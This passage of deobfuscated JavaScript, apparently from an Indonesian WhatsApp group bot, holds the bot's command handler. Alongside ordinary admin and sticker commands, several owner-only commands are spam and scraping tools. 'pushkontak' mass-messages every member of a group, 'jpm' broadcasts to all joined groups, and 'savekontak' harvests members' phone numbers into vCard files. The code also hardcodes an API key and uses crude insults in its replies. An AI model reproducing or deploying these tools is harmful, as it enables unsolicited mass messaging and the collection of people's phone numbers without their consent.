          }
          if (!v661) {
            return p148.reply("Fitur Khusus admin!");
          }
          if (!v660) {
            return p148.reply("Jadikan bot sebagai admin");
          }
          await p147.groupRevokeInvite(p148.chat).then(p260 => {
            vF9("Sukses menyetel tautan undangan grup ini");
          }).catch(() => vF9("Terjadi kesalahan"));
        }
        break;
      case "linkgrup":
      case "linkgroup":
      case "linkgc":
        {
          if (!v688) {
            return p148.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!p148.isGroup) {
            return p148.reply("Fitur Khusus Group!");
          }
          if (!v660) {
            return p148.reply("Jadikan bot sebagai admin");
          }
          let v1130 = await p147.groupInviteCode(p148.chat);
          p148.reply("https://chat.whatsapp.com/" + v1130 + "\n\nLink Group : " + v656.subject);
        }
        break;
      case "setppgroup":
      case "setppgrup":
      case "setppgc":
        {
          if (!v688) {
            return p148.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!p148.isGroup) {
            return p148.reply("Fitur Khusus Group!");
          }
          if (!v661) {
            return p148.reply("Fitur Khusus admin!");
          }
          if (!v660) {
            return p148.reply("Jadikan bot sebagai admin");
          }
          if (!v647) {
            return p148.reply("Kirim/Reply Image Dengan Caption " + (v626 + v642));
          }
          if (!/image/.test(v648)) {
            return p148.reply("Kirim/Reply Image Dengan Caption " + (v626 + v642));
          }
          if (/webp/.test(v648)) {
            return p148.reply("Kirim/Reply Image Dengan Caption " + (v626 + v642));
          }
          let v1131 = await p147.downloadAndSaveMediaMessage(v647);
          await p147.updateProfilePicture(p148.chat, {
            url: v1131
          }).catch(p261 => fs3.unlinkSync(v1131));
          p148.reply("Berhasil mengganti pp group");
        }
        break;
      case "setname":
      case "setnamegc":
      case "setsubject":
        {
          if (!v688) {
            return p148.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!p148.isGroup) {
            return p148.reply("Fitur Khusus Group!");
          }
          if (!v661) {
            return p148.reply("Fitur Khusus admin!");
          }
          if (!v660) {
            return p148.reply("Jadikan bot sebagai admin");
          }
          if (!v646) {
            return vF9("Contoh " + (v626 + v642) + " bot WhatsApp");
          }
          await p147.groupUpdateSubject(p148.chat, v646).then(p262 => vF9("Done")).catch(p263 => vF9("Terjadi kesalahan"));
        }
        break;
      case "kick":
      case "jumpshot":
      case "sulap":
      case "dor":
        {
          if (!v688) {
            return p148.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!p148.isGroup) {
            return p148.reply("Fitur Khusus Group!");
          }
          if (!v661) {
            return p148.reply("Fitur Khusus admin!");
          }
          if (!v660) {
            return p148.reply("Fitur Khusus admin!");
          }
          let v1132 = p148.mentionedJid[0] ? p148.mentionedJid[0] : p148.quoted ? p148.quoted.sender : v646.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
          await p147.groupParticipantsUpdate(p148.chat, [v1132], "remove").then(p264 => p148.reply("Sukses kick target✅")).catch(p265 => p148.reply("❌ Terjadi kesalahan"));
        }
        break;
      case "h":
      case "hidetag":
        {
          if (!v688) {
            return p148.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!p148.isGroup) {
            return vF9("Khusus grup");
          }
          if (!v661 && !v700) {
            return vF9("Fitur khusus admin");
          }
          let v1133 = p148.quoted ? v647.text : v646 ? v646 : "";
          p147.sendMessage(p148.chat, {
            text: v1133,
            mentions: v658.map(p266 => p266.id)
          }, {});
        }
        break;
      case "close":
      case "tutup":
        {
          if (!v688) {
            return p148.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!p148.isGroup) {
            return p148.reply("Fitur Khusus Group!");
          }
          if (!v661) {
            return p148.reply("Fitur Khusus admin!");
          }
          if (!v660) {
            return p148.reply("Bot bukan admin");
          }
          p147.groupSettingUpdate(p148.chat, "announcement");
          const v1134 = await getTextSetClose(p148.chat, v670);
          vF9(v1134 || "Sukses mengizinkan hanya admin yang dapat mengirim pesan ke grup ini");
        }
        break;
      case "antilink2":
        {
          if (!v688) {
            return p148.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!p148.isGroup) {
            return p148.reply("Fitur Khusus Group!");
          }
          if (!v661) {
            return p148.reply("Fitur Khusus admin!");
          }
          if (!v660) {
            return p148.reply("Bot harus menjadi admin");
          }
          if (v643[0] === "on") {
            if (v695) {
              return p148.reply("Udah aktif");
            }
            v676.push(p148.chat);
            fs3.writeFileSync("./database/antilink2.json", JSON.stringify(v676, null, 2));
            vF9("Successfully Activate antilink2 In This Group");
          } else if (v643[0] === "off") {
            if (!v695) {
              return p148.reply("Udah nonaktif");
            }
            let v1135 = v676.indexOf(p148.chat);
            v676.splice(v1135, 1);
            fs3.writeFileSync("./database/antilink2.json", JSON.stringify(v676, null, 2));
            vF9("Successfully Disabling antilink2 In This Group");
          } else {
            vF9("Kirim perintah " + (v626 + v642) + " on/off\n\nContoh: " + (v626 + v642) + " on");
          }
        }
        break;
      case "autojpm":
        {
          if (!v700) {
            return vF9(mess.only.owner);
          }
          if (!p148.isGroup) {
            return p148.reply("Fitur Khusus Group!");
          }
          if (v643[0] === "on") {
            if (v696) {
              return p148.reply("Udah aktif");
            }
            v677.push(p148.chat);
            fs3.writeFileSync("./database/autojpm.json", JSON.stringify(v677, null, 2));
            vF9("Successfully Activate autojpm In This Group");
          } else if (v643[0] === "off") {
            if (!v696) {
              return p148.reply("Udah nonaktif");
            }
            let v1136 = v677.indexOf(p148.chat);
            v676.splice(v1136, 1);
            fs3.writeFileSync("./database/autojpm.json", JSON.stringify(v677, null, 2));
            vF9("Successfully Disabling autojpm In This Group");
          } else {
            vF9("Kirim perintah " + (v626 + v642) + " on/off\n\nContoh: " + (v626 + v642) + " on");
          }
        }
        break;
      case "open":
      case "buka":
        {
          if (!v688) {
            return p148.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!p148.isGroup) {
            return p148.reply("Fitur Khusus Group!");
          }
          if (!v661) {
            return p148.reply("Fitur Khusus admin!");
          }
          if (!v660) {
            return p148.reply("Bot bukan admin");
          }
          p147.groupSettingUpdate(p148.chat, "not_announcement");
          const v1137 = await getTextSetOpen(p148.chat, v669);
          vF9(v1137 || "Sukses mengizinkan semua peserta dapat mengirim pesan ke grup ini");
        }
        break;
      case "jeda":
        {
          if (!v688) {
            return p148.reply("Grup ini belum di berikan akses menggunakan bot silahkan ketik .akses untuk memberikan akses grup");
          }
          if (!p148.isGroup) {
            return p148.reply("Fitur Khusus Group!");
          }
          if (!v661) {
            return p148.reply("Fitur Khusus admin!");
          }
          if (!v660) {
            return p148.reply("Jadikan bot sebagai admin terlebih dahulu");
          }
          if (!v646) {
            return p148.reply("kirim " + v642 + " waktu\nContoh: " + v642 + " 30m\n\nlist waktu:\ns = detik\nm = menit\nh = jam\nd = hari");
          }
          v673[p148.chat] = {
            id: p148.chat,
            time: Date.now() + toMs(v646)
          };
          fs3.writeFileSync("./database/opengc.json", JSON.stringify(v673));
          p147.groupSettingUpdate(p148.chat, "announcement").then(p267 => vF9("Sukses, group akan dibuka " + v646 + " lagi")).catch(p268 => vF9("Error"));
        }
        break;
      case "cekidgc":
        {
          if (!v700) {
            return vF9(mess.only.premium);
          }
          await vF9(mess.wait);
          let v1138 = await p147.groupFetchAllParticipating();
          let v1139 = Object.entries(v1138).slice(0).map(p269 => p269[1]);
          let v1140 = v1139.map(p270 => p270.id);
          let v1141 = "⬣ *LIST GROUP BY dray*\n\nTotal Group : " + v1140.length + " Group\n\n";
          for (let v1142 of v1140) {
            let v1143 = await p147.groupMetadata(v1142);
            v1141 += "◉ Nama : " + v1143.subject + "\n◉ ID : " + v1143.id + "\n◉ Member : " + v1143.participants.length + "\n\n────────────────────────\n\n";
          }
          vF9(v1141 + ("Untuk Penggunaan Silahkan Ketik Command " + v626 + "pushkontak id|teks\n\nSebelum Menggunakan Silahkan Salin Dulu Id Group Nya Di Atas"));
        }
        break;
      case "pushkontakid":
        {
          if (!v700) {
            return vF9(mess.owner);
          }
          let v1144 = v646.split("|")[0];
          let v1145 = v646.split("|")[1];
          if (!v1144 && !v1145) {
            return vF9("Example: " + (v626 + v642) + " idgc|pesan");
          }
          let v1146 = await p147.groupMetadata(v1144).catch(p271 => vF9(p271));
          let v1147 = await v1146.participants.filter(p272 => p272.id.endsWith(".net")).map(p273 => p273.id);
          let v1148 = v1147.length;
          let v1149 = 0;
          vF9("*BOT BY dray*\n\n*Member: " + v1147.length + "*\n*Waktu: " + v1147.length * 7 + " detik*");
          for (let v1150 = 0; v1150 < v1147.length; v1150++) {
            setTimeout(function () {
              p147.sendMessage(v1147[v1150], {
                text: v1145
              });
              v1148--;
              v1149++;
              if (v1148 === 0) {
                vF9("Pushkontak completed Mau save kontak ketik .savekontakid");
              }
            }, v1150 * 7000);
          }
        }
        break;
      case "pushkontakgc":
        {
          if (!v700) {
            return vF9(mess.owner);
          }
          if (!p148.isGroup) {
            return vF9("Khusus Di Grup Bang");
          }
          if (!v646) {
            return vF9("Teks Nya Kak?");
          }
          let v1151 = await v658.filter(p274 => p274.id.endsWith(".net")).map(p275 => p275.id);
          let v1152 = "" + q;
          vF9("*BOT BY dray*\n\n*SEDANG MELAKSANAKAN PUSH*");
          for (let v1153 of v1151) {
            await sleep(7000);
            p147.sendMessage(v1153, {
              text: "" + v1152
            }, {
              quoted: v709
            });
          }
          vF9("Pushkontak completed Mau save kontak ketik .savekontak");
        }
        break;
      case "savekontak":
      case "svkontak":
        if (!v700) {
          return vF9("Khusus Dray Store");
        }
        if (!v651) {
          return p148.reply("Khusus Group Kontol");
        }
        let v1154 = await p147.groupMetadata(p148.chat);
        let v1155 = v658.map(p276 => p276.id);
        vcard = "";
        noPort = 0;
        for (let v1156 of v1154.participants) {
          vcard += "BEGIN:VCARD\nVERSION:3.0\nFN:[" + noPort++ + "] " + global.save + "-" + v1156.id.split("@")[0] + "\nTEL;type=CELL;type=VOICE;waid=" + v1156.id.split("@")[0] + ":+" + v1156.id.split("@")[0] + "\nEND:VCARD\n";
        }
        let v1157 = "./contacts.vcf";
        vF9("*Mengimpor " + v1154.participants.length + " kontak..*");
        fs3.writeFileSync(v1157, vcard.trim());
        await sleep(2000);
        p147.sendMessage(p148.chat, {
          document: fs3.readFileSync(v1157),
          mimetype: "text/vcard",
          fileName: "Contact.vcf",
          caption: "GROUP: *" + v1154.subject + "*\nMEMBER: *" + v1154.participants.length + "*"
        }, {
          ephemeralExpiration: 86400,
          quoted: p148
        });
        fs3.unlinkSync(v1157);
        break;
      case "idgc":
      case "getkontak":
        if (!v700) {
          return vF9("Khusus Bang Dray");
        }
        if (!v651) {
          return p148.reply("Khusus Group Kontol");
        }
        huhuhs = await p147.sendMessage(p148.chat, {
          text: "*ID : " + v656.id + "\n\nJangan Lupa Di Salin Idnya Yah Bang dray*"
        }, {
          quoted: p148,
          ephemeralExpiration: 86400
        });
        await sleep(1000);
        vF9;
        break;
      case "jpm":
        {
          if (!v700) {
            return vF9("Khusus Dray Gamteng");
          }
          if (!v646) {
            throw "Text mana?\n\nExample : " + (v626 + v642) + " dray Ganteng";
          }
          let v1158 = await p147.groupFetchAllParticipating();
          let v1159 = Object.entries(v1158).slice(0).map(p277 => p277[1]);
          let v1160 = v1159.map(p278 => p278.id);
          p148.reply("Mengirim Jpm Ke " + v1160.length + " Group Chat, Waktu Selesai " + v1160.length * 1.5 + " detik");
          for (let v1161 of v1160) {
            await sleep(500);
            p147.sendMessage(v1161, {
              text: "" + v646
            }, {
              quoted: p148
            });
          }
          p148.reply("Sukses Mengirim Broadcast Ke " + v1160.length + " Group");
        }
        break;
      case "savekontakid":
        {
          if (!v700) {
            return p148.reply(mess.only.owner);
          }
          if (!v646) {
            return p148.reply("idgrupnya\n\nketik *.listgc* untuk melihat semua list id grup");
          }
          var vV6462 = v646;
          var v1162;
          try {
            v1162 = await p147.groupMetadata("" + vV6462);
          } catch (_0x2d9433) {
            return p148.reply("*ID Grup* tidak valid!");
          }
          const v1163 = await v1162.participants;
          const v1164 = await v1163.filter(p279 => p279.id.endsWith(".net")).map(p280 => p280.id);
          for (let v1165 of v1164) {
            if (v1165 !== p148.sender) {
              v685.push(v1165);
              fs3.writeFileSync("./database/dray/contacts.json", JSON.stringify(v685));
            }
          }
          try {
            const v1166 = [...new Set(v685)];
            const v1167 = v1166.map((p281, p282) => {
              const v1168 = ["BEGIN:VCARD", "VERSION:3.0", "FN:" + global.save + " " + p281.split("@")[0], "TEL;type=CELL;type=VOICE;waid=" + p281.split("@")[0] + ":+" + p281.split("@")[0], "END:VCARD", ""].join("\n");
              return v1168;
            }).join("");
            fs3.writeFileSync("./database/dray/contacts.vcf", v1167, "utf8");
          } catch (_0x13d6e3) {
            p148.reply(_0x13d6e3.toString());
          } finally {
            if (p148.chat !== p148.sender) {
              await p148.reply("File Kontak Berhasil Dikirim ke Private Chat");
            }
            await p147.sendMessage(p148.sender, {
              document: fs3.readFileSync("./database/dray/contacts.vcf"),
              fileName: "contacts.vcf",
              caption: "File Contact Berhasil Di Buat✅",
              mimetype: "text/vcard"
            }, {
              quoted: p148
            });
            v685.splice(0, v685.length);
            await fs3.writeFileSync("./database/dray/contacts.json", JSON.stringify(v685));
            await fs3.writeFileSync("./database/dray/contacts.vcf", "");
          }
        }
        break;
      case "toimage":
      case "toimg":
        {
          if (!v700) {
            return p148.reply("*Lu Di Ban Owner Gak Usah Sok asik Tolol*");
          }
          await vF9(mess.wait);
          if (!v647) {
            throw "Reply Image";
          }
          if (!/webp/.test(v648)) {
            throw "Balas sticker dengan caption *" + (v626 + v642) + "*";
          }
          let v1169 = await p147.downloadAndSaveMediaMessage(v647);
          let v1170 = await getRandom(".png");
          exec("ffmpeg -i " + v1169 + " " + v1170, p283 => {
            fs3.unlinkSync(v1169);
            if (p283) {
              throw p283;
            }
            let v1171 = fs3.readFileSync(v1170);
            p147.sendMessage(v650, {
              image: v1171
            }, {
              quoted: p148
            });
            fs3.unlinkSync(v1170);
          });
        }
        break;
      case "sticker":
      case "s":
      case "stickergif":
      case "sgif":
        {
          if (!v647) {
            throw "Balas Video/Image Dengan Caption " + (v626 + v642);
          }
          if (/image/.test(v648)) {
            let v1172 = await v647.download();
            let v1173 = await p147.sendImageAsSticker(v650, v1172, p148, {
              packname: global.packname,
              author: global.author
            });
            await fs3.unlinkSync(v1173);
          } else if (/video/.test(v648)) {
            if ((v647.msg || v647).seconds > 11) {
              return p148.reply("Maksimal 10 detik!");
            }
            let v1174 = await v647.download();
            let v1175 = await p147.sendVideoAsSticker(v650, v1174, p148, {
              packname: global.packname,
              author: global.author
            });
            await fs3.unlinkSync(v1175);
          } else {
            throw "Kirim Gambar/Video Dengan Caption " + (v626 + v642) + "\nDurasi Video 1-9 Detik";
          }
        }
        break;
      case "telegraph":
      case "tourl":
        {
          if (!v700) {
            return p148.reply("*Lu Di Ban Owner Gak Usah Sok asik Tolol*");
          }
          await vF9(mess.wait);
          if (!/video/.test(v648) && !/image/.test(v648)) {
            throw "*Send/Reply the Video/Image With Caption* " + (v626 + v642);
          }
          if (!v647) {
            throw "*Send/Reply the Video/Image Caption* " + (v626 + v642);
          }
          let {
            UploadFileUgu: _0x271145,
            webp2mp4File: _0x78374,
            TelegraPh: _0x54dd6d
          } = require("./database/uploader");
          let v1176 = await p147.downloadAndSaveMediaMessage(v647);
          if (/image/.test(v648)) {
            let v1177 = await _0x54dd6d(v1176);
            p148.reply(util2.format(v1177));
          } else if (!/image/.test(v648)) {
            let v1178 = await _0x271145(v1176);
            p148.reply(util2.format(v1178));
          }
          await fs3.unlinkSync(v1176);
        }
        break;
      case "qc":
        {
          if (!v700) {
            return p148.reply("Khusus Bang Dray");
          }
          let v1179 = p148.quoted && p148.quoted.q ? p148.quoted.text : q ? q : "";
          if (!v1179) {
            return p148.reply("Cara Penggunaan " + v626 + "qc teks");
          }
          const v1180 = "" + v1179;
          const v1181 = await p147.getName(p148.quoted ? p148.quoted.sender : p148.sender);
          const v1182 = await p147.profilePictureUrl(p148.quoted ? p148.quoted.sender : p148.sender, "image").catch(() => "https://i0.wp.com/telegra.ph/file/134ccbbd0dfc434a910ab.png");
          const v1183 = {
            type: "quote",
            format: "png",
            backgroundColor: "#FFFFFF",
            width: 700,
            height: 580,
            scale: 2,
            messages: [{
              entities: [],
              avatar: true,
              from: {
                id: 1,
                name: v1181,
                photo: {
                  url: v1182
                }
              },
              text: v1180,
              replyMessage: {}
            }]
          };
          axios2.post("https://bot.lyo.su/quote/generate", v1183, {
            headers: {
              "Content-Type": "application/json"
            }
          }).then(async p284 => {
            const v1184 = Buffer.from(p284.data.result.image, "base64");
            let v1185 = await p147.sendImageAsSticker(p148.chat, v1184, p148, {
              packname: global.packname,
              author: global.author,
              categories: ["🤩", "🎉"],
              id: "12345",
              quality: 100,
              background: "transparent"
            });
            await fs3.unlinkSync(v1185);
          });
        }
        break;
      case "remini":
      case "hd":
        {
          if (!v700) {
            return vF9("Ngapain ? Fitur Ini Buat Bang Dray");
          }
          if (!v647) {
            return vF9("Fotonya Mana?");
          }
          if (!/image/.test(v648)) {
            return vF9("Send/Reply Foto Dengan Caption " + (v626 + v642));
          }
          vF9(mess.wait);
          let v1186 = await v647.download();
          let v1187 = await remini(v1186, "enhance");
          p147.sendMessage(p148.chat, {
            image: v1187,
            caption: "🍁 Ini Hasilnya Kak..."
          }, {
            quoted: p148
          });
          await sleep(5000);
        }
        break;
      case "wmvideo":
        {
          if (!v700) {
            return p148.reply(mess.only.owner);
          }
          let v1188 = "" + v646;
          {
            if ((v647.msg || v647).seconds > 11) {
              return p148.reply("Maksimal 10 detik!");
            }
            if (/video/.test(v648)) {
              let v1189 = await v647.download();
              let v1190 = await p147.sendVideoAsSticker(v650, v1189, p148, {
                packname: "" + v1188,
                author: "" + botname
              });
              await fs3.unlinkSync(v1190);
            } else {
              throw "Kirim Gambar/Video Dengan Caption " + (v626 + v642) + "\nDurasi Video 1-9 Detik";
            }
          }
        }
        break;
      case "wm":
        {
          if (!v700) {
            return p148.reply(mess.only.owner);
          }
          let v1191 = "" + v646;
          {
            if (!v647) {
              throw "Balas Video/Image Dengan Caption " + (v626 + v642);
            }
            if (/image/.test(v648)) {
              let v1192 = await v647.download();
              let v1193 = await p147.sendImageAsSticker(v650, v1192, p148, {
                packname: "" + v1191,
                author: "" + botname
              });
              await fs3.unlinkSync(v1193);
            }
          }
        }
        break;
      case "emojimix":
        {
          if (!v700) {
            return p148.reply(mess.only.owner);
          }
          let [v1194, v1195] = v646.split`+`;
          if (!v1194) {
            throw "Example : " + (v626 + v642) + " 😅+🤔";
          }
          if (!v1195) {
            throw "Example : " + (v626 + v642) + " 😅+🤔";
          }
          let v1196 = await fetchJson("https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=" + encodeURIComponent(v1194) + "_" + encodeURIComponent(v1195));
          for (let v1197 of v1196.results) {
            let v1198 = await p147.sendImageAsSticker(v650, v1197.url, p148, {
              packname: global.packname,
              author: global.author,
              categories: v1197.tags
            });
            await fs3.unlinkSync(v1198);
          }
        }
        break;
      case "owner":
        {
          const v1199 = await p147.sendMessage(v650, {
            contacts: {
              displayName: v730.length + " Kontak",
              contacts: v730
            },
            contextInfo: {
              forwardingScore: 9999999,
              isForwarded: true,
              mentionedJid: [v653]
            }
          }, {
            quoted: p148
          });
          p147.sendMessage(v650, {
            text: "Hai Kak @" + v653.split("@")[0] + ", Ini Owner Ku Kak Kalo Mau Buy Panel Ke Dia Aja",
            contextInfo: {
              forwardingScore: 9999999,
              isForwarded: true,
              mentionedJid: [v653]
            }
          }, {
            quoted: v1199
          });
        }
        break;
      case "tagall":
        {
          if (!v700) {
            return p148.reply(mess.only.owner);
          }
          if (!v660) {
            return vF9(mess.only.badmin);
          }
          if (!v651) {
            return vF9(mess.only.group);
          }
          if (!q) {
            return vF9("Teks nya mana mek ?");
          }
          let v1200 = (q ? q : "") + "\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎